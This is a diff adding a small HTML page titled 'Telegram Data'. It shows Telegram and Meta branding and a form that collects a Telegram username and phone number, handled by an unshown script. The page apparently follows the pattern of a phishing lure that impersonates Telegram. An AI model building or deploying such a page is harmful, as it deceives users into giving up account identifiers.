@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Telegram Data</title>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+</head>
+<body>
+  <div class="card">
+    <div class="top-lang">
+      <i class="fas fa-globe"></i> English (US)
+    </div>
+    <div class="logo">
+      <i class="fab fa-telegram-plane"></i> Telegram
+    </div>
+
+    <form id="telegramForm">
+      <input type="text" id="username" placeholder="Telegram Username" required />
+      <input type="tel" id="phone" placeholder="Phone number (with country code)" required />
+      <input type="text" id="message" placeholder="Optional message" />
+      <button type="submit" class="btn-submit">Send to Telegram</button>
+    </form>
+
+    <div id="responseMsg" class="response"></div>
+
+    <div class="footer-meta">
+      <i class="fab fa-meta"></i> Meta
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
